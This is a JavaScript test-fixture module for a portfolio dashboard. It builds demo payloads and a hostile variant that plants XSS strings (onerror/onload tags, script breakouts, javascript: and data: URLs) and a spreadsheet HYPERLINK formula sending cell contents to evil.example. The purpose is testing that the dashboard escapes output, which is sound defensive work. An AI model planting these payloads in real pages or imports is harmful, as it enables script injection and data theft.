// Payload fixtures. demo-payload.json is the real payload builder's output
// (app/dashboard/payload.py) over the fictional demo ledger (app/demo_seed.py),
// captured once so the tests run without a database. The helpers below derive
// variants from it: with the W2b `config`/`alerts` blocks, and hostile.

import { loadFixture } from './harness.mjs';

export function demo() { return loadFixture('demo-payload.json'); }

/** Replace one symbol everywhere it appears as a whole JSON string (keys and values). */
export function renameSymbol(payload, from, to) {
  const json = JSON.stringify(payload).split(JSON.stringify(from)).join(JSON.stringify(to));
  return JSON.parse(json);
}

export function withConfig(payload, config) { return { ...payload, config: { ...config } }; }

/**
 * The demo payload with every field W2b's payload adds (PR #123): config,
 * stored alerts (effective_level, triggered null for no quote),
 * currencyWarnings, pvBasis, the benchmark fields, the new KPI fields with a
 * null ratio and an unpriced position, and cash entries with currency/inTotal.
 */
export function w2b() {
  const p = withConfig(demo(), { benchmark_symbol: 'VOO', benchmark_label: 'S&P 500 (VOO)', reporting_tz: 'UTC', currency: 'USD', logo_cdn: false });
  p.alerts = [
    { id: 21, symbol: 'NVDA', direction: 'above', level: 400, effective_level: 100, note: 'post-split', created_at: '2026-10-01T09:00:00+00:00',
      last_price: 193.11, last_price_ts: '2026-11-13T20:00:00+00:00', triggered: true },
    { id: 22, symbol: 'ZZZZ', direction: 'below', level: 5, effective_level: 5, note: null, created_at: '2026-10-02T09:00:00+00:00',
      last_price: null, last_price_ts: null, triggered: null },
  ];
  p.currencyWarnings = [
    { kind: 'instrument', symbol: 'SAP', currency: 'EUR', held: true, treatment: 'included_unconverted', message: 'SAP is registered in EUR; its quotes and trades are added to USD totals without conversion.' },
    { kind: 'cash', account: 'Broker EU', currency: 'EUR', treatment: 'excluded', message: 'Cash in Broker EU is recorded in EUR and is left out of USD totals.' },
  ];
  p.pvBasis = { '1D': 'today', '1W': 'trailing_7d', '1M': 'trailing_30d', '1Y': 'all_history' };
  p.returns = { ...p.returns, benchmark: 'S&P 500 (VOO) (price return, excl. its dividends)', benchmarkSymbol: 'VOO', benchmarkAvailable: true };
  p.risk = { ...p.risk, benchmark: 'VOO' };
  Object.assign(p.kpi, {
    pricedCostBasis: p.kpi.costBasis - 1000, unpricedCostBasis: 1000, unpricedSymbols: ['ZZZZ'],
    investedCapital: 60000, totalReturnPct: null, totalReturnBasis: '(realized + unrealized P&L on priced positions) / peak net invested capital',
    totalReturnPartial: true, feeDragPct: 0.02, yieldOnCostPct: null, totalReturnWithIncomePct: null,
  });
  p.kpi.unrealized = Math.round((p.kpi.marketValue - p.kpi.pricedCostBasis) * 100) / 100;
  p.kpi.cashAccounts = p.kpi.cashAccounts.map((a) => ({ ...a, as_of: a.asOf, currency: 'USD', inTotal: true }))
    .concat([{ account: 'Broker EU', cash: 900, as_of: '2026-09-01T10:00:00+00:00', asOf: '2026-09-01T10:00:00+00:00', currency: 'EUR', inTotal: false }]);
  return p;
}

export const SAMPLE_ALERTS = [
  { id: 11, symbol: 'AAPL', direction: 'above', level: 150, note: 'trim here', created_at: '2026-11-01T09:00:00+00:00',
    last_price: 182.5, last_price_ts: '2026-11-13T21:00:00+00:00', triggered: true },
  { id: 12, symbol: 'MSFT', direction: 'below', level: 100, note: null, created_at: '2026-11-02T09:00:00+00:00',
    last_price: 410.2, last_price_ts: '2026-11-13T21:00:00+00:00', triggered: false },
];

// Every string a hostile CSV import or a hostile vendor could plant. Each tries
// to run window.__pwned(); the XSS test asserts it never runs and that no
// element or attribute it describes ever appears.
export const H = {
  tag: '<img src=x onerror=window.__pwned()>',
  quote: 'Q" onmouseover="window.__pwned()" data-x="',
  entity: '&#60;img src=x onerror=window.__pwned()&#62;',
  script: '</script><script>window.__pwned()</script>',
  svg: '<svg onload=window.__pwned()>',
  apos: '\'"><iframe src=javascript:window.__pwned()>',
  formula: '=HYPERLINK("http://evil.example/?"&A1,"click")',
  url: 'javascript:window.__pwned()',
  dataHtml: 'data:text/html,<script>window.__pwned()</script>',
};

export function hostile() {
  let p = demo();
  p = renameSymbol(p, 'NVDA', H.tag);
  p = renameSymbol(p, 'AMD', H.quote);
  p = renameSymbol(p, 'JNJ', H.entity);
  p = renameSymbol(p, 'Broker A', H.apos);
  const stocks = p.stocks;
  Object.values(stocks).forEach((s, i) => {
    s.name = [H.script, H.svg, H.tag, H.apos][i % 4] + ' Corp';
    s.sector = i % 2 ? H.svg : H.script;
  });
  p.histLots.forEach((l) => { l.notes = H.formula + H.tag; });
  p.news = [
    { sym: H.tag, title: H.script, body: H.svg, src: H.apos, time: H.tag, url: H.url },
    { sym: H.quote, title: H.tag, body: '', src: 'x', time: 'now', url: H.dataHtml },
  ];
  p.markets = p.markets.map((m) => ({ ...m, label: H.tag }));
  p.degraded = [H.script];
  p.snapshot = { text: H.svg, level: 'warn' };
  p.latestPrices.forEach((r) => { r.source = H.tag; r.ts = H.quote; });
  p.snapLog.forEach((r) => { r.source = H.svg; r.ts = H.tag; });
  Object.keys(p.alloc).forEach((dim) => { p.alloc[dim].forEach((r) => { r.key = H.quote; }); });
  p.logos = { [H.tag]: H.url, [H.quote]: 'x" onerror="window.__pwned()', AAPL: H.dataHtml };
  if (p.stats && p.stats.day && p.stats.day.best) p.stats.day.best.label = H.script;
  Object.values(p.fundamentals).forEach((fd) => {
    if (!fd || typeof fd !== 'object') return;
    fd.name = H.script; fd.exchange = H.tag; fd.sector = H.svg; fd.industry = H.apos;
    fd.filings = [{ date: H.tag, type: H.svg, url: H.url }, { date: '2026-01-01', type: '10-K', url: H.dataHtml }];
    fd.insiders = [{ date: H.tag, name: H.script, type: H.quote, value: 1 }];
    fd.holders = [{ investor: H.tag, period: H.svg, shares: 1, value: 2 }];
    fd.earnings = [{ period: H.tag, eps_actual: 1, eps_estimate: 1, eps_surprise: H.svg, revenue_actual: 1 }];
    fd.isEtf = false;
  });
  p.alerts = [
    { id: H.quote, symbol: H.tag, direction: H.svg, level: 1, note: H.script, created_at: H.tag, last_price: 2, last_price_ts: H.apos, triggered: true },
    { id: 2, symbol: H.entity, direction: 'below', level: 'NaN', note: H.svg, created_at: null, last_price: null, last_price_ts: null, triggered: false },
  ];
  p.config = { benchmark_symbol: 'SPY', benchmark_label: H.tag, reporting_tz: H.script, currency: H.svg, logo_cdn: false };
  p.kpi.cashAccounts.forEach((a, i) => { a.as_of = H.tag; a.currency = i ? H.svg : 'USD'; a.inTotal = !i; });
  p.kpi.realizedBySymbol = [{ sym: H.tag, realized: 5 }];
  Object.assign(p.kpi, { unpricedSymbols: [H.tag, H.quote], unpricedCostBasis: 1, pricedCostBasis: 1, investedCapital: 2,
    totalReturnBasis: H.svg, totalReturnPartial: true, totalReturnPct: null });
  p.currencyWarnings = [{ kind: H.tag, currency: H.svg, treatment: 'excluded', message: H.script }, { kind: 'income', currency: H.tag }];
  p.pvBasis = { '1Y': H.tag, '1M': 'all_history' };
  p.alerts[0].effective_level = H.tag;
  p.returns = { ...p.returns, benchmark: H.script, benchmarkAvailable: false };
  return p;
}
